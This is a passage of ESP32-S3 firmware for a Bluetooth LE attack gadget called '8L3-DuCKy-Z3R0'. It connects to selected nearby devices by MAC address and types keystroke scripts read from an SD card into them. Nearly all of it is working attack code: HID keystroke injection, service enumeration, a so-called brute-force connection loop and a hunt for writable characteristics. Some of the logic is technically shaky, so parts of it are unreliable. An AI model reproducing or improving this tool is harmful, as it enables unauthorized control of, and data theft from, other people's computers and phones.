  for (int i = 0; i < selectedDevices.size(); i++) {
    if (selectedDevices[i]) {
      executeScriptOnDevice(deviceMACs[i]);
      vTaskDelay(pdMS_TO_TICKS(1000)); // S3 optimized delay
    }
  }

  showMessage("Attacks complete!\nPress SELECT to\ncontinue");
  delay(3000);
  previousMenu = currentMenu;
  currentMenu = MAIN_MENU;
  menuIndex = 0;
  displayMainMenu();
}

void executeScriptOnDevice(String macAddress) {
  Serial.println("8L3-DuCKy-Z3R0 Attacking device: " + macAddress);
  currentTargetMAC = macAddress;

  if (xSemaphoreTake(displayMutex, portMAX_DELAY)) {
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("Attacking:");
    String shortMAC = macAddress.substring(0, 17);
    display.println(shortMAC);
    display.println();
    xSemaphoreGive(displayMutex);
  }

  bool connectionSuccess = false;

  switch (attackMode) {
    case 0: // HID Injection Attack
      if (xSemaphoreTake(displayMutex, portMAX_DELAY)) {
        display.println("HID Injection...");
        display.display();
        xSemaphoreGive(displayMutex);
      }
      connectionSuccess = performHIDAttack(macAddress);
      break;
    case 1: // Service Discovery
      if (xSemaphoreTake(displayMutex, portMAX_DELAY)) {
        display.println("Service Scan...");
        display.display();
        xSemaphoreGive(displayMutex);
      }
      connectionSuccess = performServiceDiscovery(macAddress);
      break;
    case 2: // Brute Force
      if (xSemaphoreTake(displayMutex, portMAX_DELAY)) {
        display.println("Brute Force...");
        display.display();
        xSemaphoreGive(displayMutex);
      }
      connectionSuccess = performBruteForce(macAddress);
      break;
  }

  if (!connectionSuccess) {
    Serial.println("Failed to connect to: " + macAddress);
    return;
  }

  // Execute script commands with S3 optimizations
  File scriptFile = SD.open("/" + selectedScript);
  if (!scriptFile) {
    Serial.println("Failed to open script file: " + selectedScript);
    return;
  }

  Serial.println("Executing script: " + selectedScript);
  while (scriptFile.available()) {
    String command = scriptFile.readStringUntil('\n');
    command.trim();

    if (command.length() > 0 && !command.startsWith("//") && !command.startsWith("REM")) {
      Serial.println("Executing: " + command);
      processScriptCommand(command, macAddress);
      vTaskDelay(pdMS_TO_TICKS(50)); // S3 optimized delay
    }
  }

  scriptFile.close();
  disconnectFromDevice();
}

void processScriptCommand(String command, String targetMAC) {
  command.trim();
  command.toUpperCase();

  if (command.startsWith("DELAY")) {
    int delayTime = command.substring(6).toInt();
    Serial.println("Delay: " + String(delayTime) + "ms");
    vTaskDelay(pdMS_TO_TICKS(delayTime));
  }
  else if (command.startsWith("STRING")) {
    String text = command.substring(7);
    Serial.println("Sending string: " + text);
    sendHIDString(text);
  }
  else if (command.startsWith("ENTER") || command.startsWith("RETURN")) {
    Serial.println("Sending ENTER");
    sendHIDKey(0x28); // HID Enter key
  }
  else if (command.startsWith("TAB")) {
    Serial.println("Sending TAB");
    sendHIDKey(0x2B); // HID Tab key
  }
  else if (command.startsWith("ESC") || command.startsWith("ESCAPE")) {
    Serial.println("Sending ESC");
    sendHIDKey(0x29); // HID Escape key
  }
  else if (command.startsWith("SPACE")) {
    Serial.println("Sending SPACE");
    sendHIDKey(0x2C); // HID Space key
  }
  else if (command.startsWith("BACKSPACE")) {
    Serial.println("Sending BACKSPACE");
    sendHIDKey(0x2A); // HID Backspace key
  }
  else if (command.startsWith("DELETE")) {
    Serial.println("Sending DELETE");
    sendHIDKey(0x2E); // HID Delete key
  }
  else if (command.startsWith("UP") || command.startsWith("UPARROW")) {
    Serial.println("Sending UP ARROW");
    sendHIDKey(0x52); // HID Up Arrow
  }
  else if (command.startsWith("DOWN") || command.startsWith("DOWNARROW")) {
    Serial.println("Sending DOWN ARROW");
    sendHIDKey(0x51); // HID Down Arrow
  }
  else if (command.startsWith("LEFT") || command.startsWith("LEFTARROW")) {
    Serial.println("Sending LEFT ARROW");
    sendHIDKey(0x50); // HID Left Arrow
  }
  else if (command.startsWith("RIGHT") || command.startsWith("RIGHTARROW")) {
    Serial.println("Sending RIGHT ARROW");
    sendHIDKey(0x4F); // HID Right Arrow
  }
  else if (command.startsWith("GUI") || command.startsWith("WINDOWS")) {
    Serial.println("Sending GUI/Windows key");
    sendHIDModifier(0x08); // Left GUI
  }
  else if (command.startsWith("CTRL") || command.startsWith("CONTROL")) {
    Serial.println("Sending CTRL");
    sendHIDModifier(0x01); // Left Ctrl
  }
  else if (command.startsWith("ALT")) {
    Serial.println("Sending ALT");
    sendHIDModifier(0x04); // Left Alt
  }
  else if (command.startsWith("SHIFT")) {
    Serial.println("Sending SHIFT");
    sendHIDModifier(0x02); // Left Shift
  }
  else if (command.startsWith("REM") || command.startsWith("//")) {
    Serial.println("Comment: " + command);
  }
  else if (command.startsWith("F1")) {
    sendHIDKey(0x3A); // F1
  }
  else if (command.startsWith("F2")) {
    sendHIDKey(0x3B); // F2
  }
  else if (command.startsWith("F3")) {
    sendHIDKey(0x3C); // F3
  }
  else if (command.startsWith("F4")) {
    sendHIDKey(0x3D); // F4
  }
  else if (command.startsWith("F5")) {
    sendHIDKey(0x3E); // F5
  }
  else if (command.startsWith("F6")) {
    sendHIDKey(0x3F); // F6
  }
  else if (command.startsWith("F7")) {
    sendHIDKey(0x40); // F7
  }
  else if (command.startsWith("F8")) {
    sendHIDKey(0x41); // F8
  }
  else if (command.startsWith("F9")) {
    sendHIDKey(0x42); // F9
  }
  else if (command.startsWith("F10")) {
    sendHIDKey(0x43); // F10
  }
  else if (command.startsWith("F11")) {
    sendHIDKey(0x44); // F11
  }
  else if (command.startsWith("F12")) {
    sendHIDKey(0x45); // F12
  }
  else if (command.startsWith("HOME")) {
    sendHIDKey(0x4A); // Home
  }
  else if (command.startsWith("END")) {
    sendHIDKey(0x4D); // End
  }
  else if (command.startsWith("PAGEUP")) {
    sendHIDKey(0x4B); // Page Up
  }
  else if (command.startsWith("PAGEDOWN")) {
    sendHIDKey(0x4E); // Page Down
  }
  else if (command.startsWith("INSERT")) {
    sendHIDKey(0x49); // Insert
  }
  else if (command.startsWith("CAPSLOCK")) {
    sendHIDKey(0x39); // Caps Lock
  }
  else if (command.startsWith("NUMLOCK")) {
    sendHIDKey(0x53); // Num Lock
  }
  else if (command.startsWith("SCROLLLOCK")) {
    sendHIDKey(0x47); // Scroll Lock
  }
  else if (command.startsWith("PRINTSCREEN")) {
    sendHIDKey(0x46); // Print Screen
  }
  else if (command.startsWith("PAUSE")) {
    sendHIDKey(0x48); // Pause
  }
  else if (command.startsWith("MENU")) {
    sendHIDKey(0x65); // Menu key
  }
  // Enhanced S3 commands
  else if (command.startsWith("COMBO ")) {
    String combo = command.substring(6);
    processComboCommand(combo);
  }
  else if (command.startsWith("REPEAT ")) {
    String repeatCmd = command.substring(7);
    int spacePos = repeatCmd.indexOf(' ');
    if (spacePos > 0) {
      int repeatCount = repeatCmd.substring(0, spacePos).toInt();
      String cmdToRepeat = repeatCmd.substring(spacePos + 1);
      for (int i = 0; i < repeatCount; i++) {
        processScriptCommand(cmdToRepeat, targetMAC);
        vTaskDelay(pdMS_TO_TICKS(100));
      }
    }
  }
  else if (command.startsWith("WAIT_FOR_TARGET")) {
    // Wait for target to be ready (S3 specific)
    vTaskDelay(pdMS_TO_TICKS(2000));
  }
  else {
    Serial.println("Unknown command: " + command);
  }
}

void processComboCommand(String combo) {
  // Process key combinations like "CTRL+ALT+DEL"
  std::vector<String> keys;
  int lastIndex = 0;
  int index = combo.indexOf('+');

  while (index != -1) {
    keys.push_back(combo.substring(lastIndex, index));
    lastIndex = index + 1;
    index = combo.indexOf('+', lastIndex);
  }
  keys.push_back(combo.substring(lastIndex));

  // Press all keys
  uint8_t hidReport[8] = {0};
  uint8_t modifiers = 0;
  uint8_t keyCount = 0;

  for (const String& key : keys) {
    String upperKey = key;
    upperKey.toUpperCase();
    upperKey.trim();

    if (upperKey == "CTRL" || upperKey == "CONTROL") {
      modifiers |= 0x01;
    } else if (upperKey == "SHIFT") {
      modifiers |= 0x02;
    } else if (upperKey == "ALT") {
      modifiers |= 0x04;
    } else if (upperKey == "GUI" || upperKey == "WINDOWS") {
      modifiers |= 0x08;
    } else if (upperKey == "DEL" || upperKey == "DELETE") {
      hidReport[2 + keyCount] = 0x2E;
      keyCount++;
    } else if (upperKey.length() == 1) {
      char c = upperKey.charAt(0);
      uint8_t hidKey = charToHID(c);
      if (hidKey != 0 && keyCount < 6) {
        hidReport[2 + keyCount] = hidKey;
        keyCount++;
      }
    }
  }

  hidReport[0] = modifiers;

  // Send key combination
  if (isConnected && pRemoteCharacteristic != nullptr) {
    pRemoteCharacteristic->writeValue(hidReport, 8);
    vTaskDelay(pdMS_TO_TICKS(100));

    // Release all keys
    memset(hidReport, 0, 8);
    pRemoteCharacteristic->writeValue(hidReport, 8);
    vTaskDelay(pdMS_TO_TICKS(50));
  }
}

void showMessage(String message) {
  if (xSemaphoreTake(displayMutex, portMAX_DELAY)) {
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println(message);
    display.display();
    xSemaphoreGive(displayMutex);
  }
  delay(2000);
}

// Enhanced BLE Client Callback Class for S3
class MyClientCallback : public BLEClientCallbacks {
  void onConnect(BLEClient* pclient) {
    Serial.println("Client connected successfully");
  }

  void onDisconnect(BLEClient* pclient) {
    isConnected = false;
    Serial.println("Client disconnected");
  }
};

// Enhanced BLE Attack Functions for ESP32-S3
bool performHIDAttack(String targetMAC) {
  Serial.println("HID injection attack on: " + targetMAC);

  BLEAddress bleAddress(targetMAC.c_str());
  pClient = BLEDevice::createClient();
  pClient->setClientCallbacks(new MyClientCallback());

  // FIX: Use correct ESP32 BLE address type constants
  bool connected = false;
  for (int attempt = 0; attempt < 3 && !connected; attempt++) {
    Serial.println("Connection attempt " + String(attempt + 1) + "/3");

    if (pClient->connect(bleAddress, BLE_ADDR_RANDOM)) {
      connected = true;
    } else if (pClient->connect(bleAddress, BLE_ADDR_PUBLIC)) {
      connected = true;
    }

    if (!connected) {
      vTaskDelay(pdMS_TO_TICKS(1000));
    }
  }

  if (!connected) {
    Serial.println("All connection attempts failed");
    delete pClient;
    pClient = nullptr;
    return false;
  }

  Serial.println("Connected! Searching for HID service...");

  // Look for HID service with S3 enhanced discovery
  pRemoteService = pClient->getService(BLEUUID(HID_SERVICE_UUID));
  if (pRemoteService == nullptr) {
    Serial.println("No HID service found, trying generic services...");
    return performGenericAttack();
  }

  // Get HID Report characteristic
  pRemoteCharacteristic = pRemoteService->getCharacteristic(BLEUUID(HID_REPORT_UUID));
  if (pRemoteCharacteristic == nullptr) {
    Serial.println("No HID Report characteristic found");
    return false;
  }

  isConnected = true;
  Serial.println("HID attack ready!");
  return true;
}

bool performServiceDiscovery(String targetMAC) {
  Serial.println("service discovery on: " + targetMAC);

  BLEAddress bleAddress(targetMAC.c_str());
  pClient = BLEDevice::createClient();
  pClient->setClientCallbacks(new MyClientCallback());

  if (!pClient->connect(bleAddress)) {
    Serial.println("Discovery connection failed");
    delete pClient;
    pClient = nullptr;
    return false;
  }

  Serial.println("Connected for enhanced discovery. Enumerating services...");

  std::map<std::string, BLERemoteService*>* services = pClient->getServices();
  if (services != nullptr) {
    Serial.println("=== SERVICE DISCOVERY RESULTS ===");
    for (auto &pair : *services) {
      BLERemoteService* service = pair.second;
      String serviceUUID = service->getUUID().toString().c_str();
      Serial.println("Service: " + serviceUUID + " (" + analyzeServiceUUID(serviceUUID) + ")");

      std::map<std::string, BLERemoteCharacteristic*>* characteristics = service->getCharacteristics();
      if (characteristics != nullptr) {
        for (auto &charPair : *characteristics) {
          BLERemoteCharacteristic* characteristic = charPair.second;
          String charUUID = characteristic->getUUID().toString().c_str();
          Serial.println("  Char: " + charUUID);

          // Enhanced property analysis
          String props = "";
          if (characteristic->canRead()) props += "R";
          if (characteristic->canWrite()) props += "W";
          if (characteristic->canNotify()) props += "N";
          if (characteristic->canIndicate()) props += "I";
          if (characteristic->canBroadcast()) props += "B";
          if (props.length() == 0) props = "Unknown";

          Serial.println("  Props: " + props);

          // Try to read characteristic if possible (S3 enhanced)
          if (characteristic->canRead()) {
            try {
              String valueStr = characteristic->readValue();
              Serial.println("  Value length: " + String(valueStr.length()) + " bytes");
            } catch (const std::exception& e) {
              Serial.println("  Read failed: " + String(e.what()));
            } catch (...) {
              Serial.println("  Read failed: Unknown error");
            }
          }

        }
      }
    }
    Serial.println("=== END DISCOVERY ===");
  }

  return true;
}

bool performBruteForce(String targetMAC) {
  Serial.println("brute force connection to: " + targetMAC);

  BLEAddress bleAddress(targetMAC.c_str());
  pClient = BLEDevice::createClient();
  pClient->setClientCallbacks(new MyClientCallback());

  // S3 enhanced brute force with simple connection attempts
  for (int attempt = 0; attempt < 3; attempt++) {
    Serial.println("Brute force attempt: " + String(attempt + 1) + "/3");

    if (pClient->connect(bleAddress)) {
      Serial.println("Brute force connection successful!");
      return performGenericAttack();
    }

    vTaskDelay(pdMS_TO_TICKS(1500)); // S3 optimized delay
  }

  Serial.println("Brute force failed completely");
  delete pClient;
  pClient = nullptr;
  return false;
}

bool performGenericAttack() {
  Serial.println("Performing enhanced generic attack...");

  // Search for any writable characteristics with S3 optimizations
  std::map<std::string, BLERemoteService*>* services = pClient->getServices();
  if (services != nullptr) {
    for (auto &pair : *services) {
      BLERemoteService* service = pair.second;
      std::map<std::string, BLERemoteCharacteristic*>* characteristics = service->getCharacteristics();
      if (characteristics != nullptr) {
        for (auto &charPair : *characteristics) {
          BLERemoteCharacteristic* characteristic = charPair.second;

          if (characteristic->canWrite()) {
            String charUUID = characteristic->getUUID().toString().c_str();
            Serial.println("Found writable characteristic: " + charUUID);
            pRemoteCharacteristic = characteristic;
            isConnected = true;
            return true;
          }
        }
      }
    }
  }

  Serial.println("Generic attack: No writable characteristics found");
  return false;
}

void sendHIDString(String text) {
  if (!isConnected || pRemoteCharacteristic == nullptr) {
    Serial.println("Not connected or no characteristic available");
    return;
  }

  Serial.println("Sending HID string: " + text);

  // Convert string to HID key codes with S3 optimizations
  for (int i = 0; i < text.length(); i++) {
    uint8_t hidReport[8] = {0}; // Standard HID keyboard report
    char c = text.charAt(i);

    // Convert character to HID usage code
    uint8_t hidKey = charToHID(c);
    uint8_t modifier = 0;

    // Handle uppercase letters (need shift)
    if (c >= 'A' && c <= 'Z') {
      modifier = 0x02; // Left Shift
    }

    // Handle special characters that need shift
    if (c == '!' || c == '@' || c == '#' || c == '$' || c == '%' ||
        c == '^' || c == '&' || c == '*' || c == '(' || c == ')' ||
        c == '_' || c == '+' || c == '{' || c == '}' || c == '|' ||
        c == ':' || c == '"' || c == '<' || c == '>' || c == '?') {
      modifier = 0x02; // Left Shift
      hidKey = getShiftedHIDKey(c);
    }

    if (hidKey != 0) {
      hidReport[0] = modifier; // Modifier byte
      hidReport[2] = hidKey;   // First key in report

      // Send key press
      pRemoteCharacteristic->writeValue(hidReport, 8);
      vTaskDelay(pdMS_TO_TICKS(20)); // S3 optimized delay

      // Send key release
      memset(hidReport, 0, 8);
      pRemoteCharacteristic->writeValue(hidReport, 8);
      vTaskDelay(pdMS_TO_TICKS(20)); // S3 optimized delay
    }
  }
}

void sendHIDKey(uint8_t keyCode) {
  if (!isConnected || pRemoteCharacteristic == nullptr) {
    Serial.println("Not connected or no characteristic available");
    return;
  }

  uint8_t hidReport[8] = {0};
  hidReport[2] = keyCode;

  // Send key press
  pRemoteCharacteristic->writeValue(hidReport, 8);
  vTaskDelay(pdMS_TO_TICKS(50)); // S3 optimized

  // Send key release
  memset(hidReport, 0, 8);
  pRemoteCharacteristic->writeValue(hidReport, 8);
  vTaskDelay(pdMS_TO_TICKS(50)); // S3 optimized
}

void sendHIDModifier(uint8_t modifier) {
  if (!isConnected || pRemoteCharacteristic == nullptr) {
    Serial.println("Not connected or no characteristic available");
    return;
  }

  uint8_t hidReport[8] = {0};
  hidReport[0] = modifier; // Modifier byte

  // Send modifier press
  pRemoteCharacteristic->writeValue(hidReport, 8);
  vTaskDelay(pdMS_TO_TICKS(100)); // S3 optimized

  // Send modifier release
  memset(hidReport, 0, 8);
  pRemoteCharacteristic->writeValue(hidReport, 8);
  vTaskDelay(pdMS_TO_TICKS(50)); // S3 optimized
}

uint8_t charToHID(char c) {
  // Enhanced character to HID conversion for S3
  if (c >= 'a' && c <= 'z') {
    return 0x04 + (c - 'a'); // a-z = 0x04-0x1D
  }
  if (c >= 'A' && c <= 'Z') {
    return 0x04 + (c - 'A'); // A-Z = 0x04-0x1D (with shift)
  }
  if (c >= '1' && c <= '9') {
    return 0x1E + (c - '1'); // 1-9 = 0x1E-0x26
  }
  if (c == '0') return 0x27;
  if (c == ' ') return 0x2C; // Space
  if (c == '.') return 0x37; // Period
  if (c == ',') return 0x36; // Comma
  if (c == ';') return 0x33; // Semicolon
  if (c == '/') return 0x38; // Forward slash
  if (c == '\\') return 0x31; // Backslash
  if (c == '\'') return 0x34; // Apostrophe
  if (c == '=') return 0x2E; // Equal
  if (c == '-') return 0x2D; // Minus
  if (c == '[') return 0x2F; // Left bracket
  if (c == ']') return 0x30; // Right bracket
  if (c == '`') return 0x35; // Grave accent

  return 0; // Unknown character
}

uint8_t getShiftedHIDKey(char c) {
  // Return HID key codes for shifted characters
  switch (c) {
    case '!': return 0x1E; // Shift+1
    case '@': return 0x1F; // Shift+2
    case '#': return 0x20; // Shift+3
    case '$': return 0x21; // Shift+4
    case '%': return 0x22; // Shift+5
    case '^': return 0x23; // Shift+6
    case '&': return 0x24; // Shift+7
    case '*': return 0x25; // Shift+8
    case '(': return 0x26; // Shift+9
    case ')': return 0x27; // Shift+0
    case '_': return 0x2D; // Shift+-
    case '+': return 0x2E; // Shift+=
    case '{': return 0x2F; // Shift+[
    case '}': return 0x30; // Shift+]
    case '|': return 0x31; // Shift+\
    case ':': return 0x33; // Shift+;
    case '"': return 0x34; // Shift+apostrophe
    case '<': return 0x36; // Shift+,
    case '>': return 0x37; // Shift+.
    case '?': return 0x38; // Shift+/
    case '~': return 0x35; // Shift+`
    default: return 0;
  }
}

void disconnectFromDevice() {
  if (pClient && isConnected) {
    pClient->disconnect();
    isConnected = false;
    Serial.println("Disconnected from target");
    delete pClient;
    pClient = nullptr;
  }
}

void cycleAttackMode() {
  attackMode = (attackMode + 1) % 3;
  String mode = "";
  switch (attackMode) {
    case 0:
      mode = "HID Injection";
      break;
    case 1:
      mode = "Service Discovery";
      break;
    case 2:
      mode = "Brute Force";
      break;
  }

  showMessage("Attack Mode:\n" + mode);
  delay(1000);
  currentMenu = MAIN_MENU;
  menuIndex = 0;
  displayMainMenu();
}

void showDeviceInfo() {
  if (xSemaphoreTake(displayMutex, portMAX_DELAY)) {
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("=== DEVICE INFO ===");
    display.println();

    int selectedCount = 0;
    for (bool selected : selectedDevices) {
      if (selected) selectedCount++;
    }

    display.print("Total found: ");
    display.println(discoveredDevices.size());
    display.print("Selected: ");
    display.println(selectedCount);
    display.print("Scripts: ");
    display.println(scriptFiles.size());
    display.println();

    String mode = "";
    switch (attackMode) {
      case 0: mode = "HID Inject"; break;
      case 1: mode = "Service Scan"; break;
      case 2: mode = "Brute Force"; break;
    }
    display.print("Mode: ");
    display.println(mode);
    display.println();

    display.print("Flash: ");
    display.print(ESP.getFlashChipSize() / 1024 / 1024);
    display.println("MB");

    display.print("Free heap: ");
    display.print(ESP.getFreeHeap() / 1024);
    display.println("KB");

    display.print("Script: ");
    if (selectedScript.length() > 0) {
      String shortScript = selectedScript;
      if (shortScript.length() > 8) {
        shortScript = shortScript.substring(0, 5) + "...";
      }
      display.println(shortScript);
    } else {
      display.println("None");
    }

    // Show SD card logging info
    display.println();
    display.print("Session ID: ");
    display.println(currentSessionID);
    
    display.print("Log entries: ");
    File logFile = SD.open(DEVICE_LOG_FILE, FILE_READ);
    int logCount = 0;
    if (logFile) {
      while (logFile.available()) {
        String line = logFile.readStringUntil('\n');
        if (line.length() > 0) logCount++;
      }
      logFile.close();
      logCount = max(0, logCount - 1); // Subtract header line
    }
    display.println(logCount);

    display.display();
    xSemaphoreGive(displayMutex);
  }

  delay(5000);

  currentMenu = MAIN_MENU;
  menuIndex = 0;
  displayMainMenu();
}
